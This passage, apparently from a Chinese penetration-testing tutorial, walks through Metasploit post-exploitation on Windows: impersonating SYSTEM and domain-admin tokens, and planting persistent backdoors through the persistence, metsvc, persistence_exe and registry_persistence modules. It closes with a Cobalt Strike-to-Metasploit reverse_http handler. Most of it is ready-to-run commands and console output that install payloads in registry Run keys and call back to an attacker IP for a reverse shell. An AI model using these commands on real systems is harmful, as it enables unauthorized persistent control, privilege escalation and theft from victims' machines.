[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
[*] Running PowerDump to extract Username and Password Hashes...
[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...
[*] Setting ExecutionPolicy to Unrestricted...
[*] Dumping the SAM database through PowerShell...

[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.
```

###  假冒令牌

在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。

msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。

```bash
# 1.incognito假冒令牌
use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token

# 2.steal_token窃取令牌
steal_token <pid值>   #从指定进程中窃取token   先ps,找域控进程
drop_token  #删除窃取的token
```

###  植入后门

Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。

1.persistence启动项后门

路径：metasploit/scripts/meterpreter/persistence

原理是在`C:\Users***\AppData\Local\Temp\`目录下，上传一个vbs脚本，在注册表`HKLM\Software\Microsoft\Windows\CurrentVersion\Run\`加入开机启动项，**很容易被杀软拦截，官方不推荐**

```bash
run persistence –h  #查看帮助
run persistence -X -i 5 -p 4444 -r 192.168.81.160
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
# 示例
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.81.160

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444
[*] Persistent agent script is 99630 bytes long
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[+] Agent executed with PID 3540
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
```

能实现同样功能的脚本还有：exploit/windows/local/persistence

2.metsvc服务后门

在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本
在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。**通过服务启动，需要管理员权限，官方不推荐使用，运行失败**

```bash
run metsvc –A   #自动安装后门

# 示例
meterpreter > run metsvc –A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
    Cannot open service manager (0x00000005)

meterpreter > ls
Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH
========================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll
100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe
100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe
```

三个文件上传成功，但服务没有启动起来，失败了。使用`-r`参数可卸载服务。

3.persistence_exe

再来看看官方推荐的东西吧

```bash
meterpreter > info post/windows/manage/persistence_exe

       Name: Windows Manage Persistent EXE Payload Installer
     Module: post/windows/manage/persistence_exe
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Merlyn drforbin Cousins <drforbin6@gmail.com>

Compatible session types:
  Meterpreter

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  REXENAME  default.exe      yes       The name to call exe on remote system
  REXEPATH                   yes       The remote executable to upload and execute.
  SESSION                    yes       The session to run this module on.
  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)

Description:
  This Module will upload an executable to a remote host and make it 
  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
  will start on user login, SYSTEM will start on system boot but 
  requires privs. SERVICE will create a new service which will start 
  the payload. Again requires privs.



Module options (post/windows/manage/persistence_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   REXENAME  default.exe      yes       The name to call exe on remote system
   REXEPATH                   yes       The remote executable to upload and execute.
   SESSION                    yes       The session to run this module on.
   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
```

此模块将可执行文件上载到远程主机并进行创建持久性。
涉及到四个参数

- REXENAME是拷贝到目标系统中的名字
- EXEPATH是将要上传的后门在本地的位置
- SESSION是选择运行此模块的会话
- STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。

尝试一下：

```bash
meterpreter > run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER

[*] Running module against SAUCERMAN
[*] Reading Payload from file /home/ubuntu/shell.exe
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
[+] Agent executed with PID 3684
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc
```

4.registry_persistence

完整路径为exploit/windows/local/registry_persistence

和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。

```bash
meterpreter > background
[*] Backgrounding session 13...
msf5 auxiliary(server/socks5) > use exploit/windows/local/registry_persistence
msf5 exploit(windows/local/registry_persistence) > show options

Module options (exploit/windows/local/registry_persistence):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)
   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)
   CREATE_RC      true             no        Create a resource file for cleanup
   RUN_NAME                        no        The name to use for the 'Run' key. (Default: random)
   SESSION                         yes       The session to run this module on.
   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)
   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/local/registry_persistence) > set SESSION 13
SESSION => 13
msf5 exploit(windows/local/registry_persistence) > run

[*] Generating payload blob..
[+] Generated payload, 6048 bytes
[*] Root path is HKCU
[*] Installing payload blob..
[+] Created registry key HKCU\Software\0BaG3zDR
[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD
[*] Installing run key
[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB
[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc
```

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。



# cs大全

cs派生msf

```bash

msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_http
msf exploit(handler) > set lhost 192.168.0.143
msf exploit(handler) > set lport 4444
msf exploit(handler) > exploit

cs创建一个windows/foreign/reverse_http的 Listener
然后选中对应机器，右键->Spawn，选择刚刚创建的监听器。
```




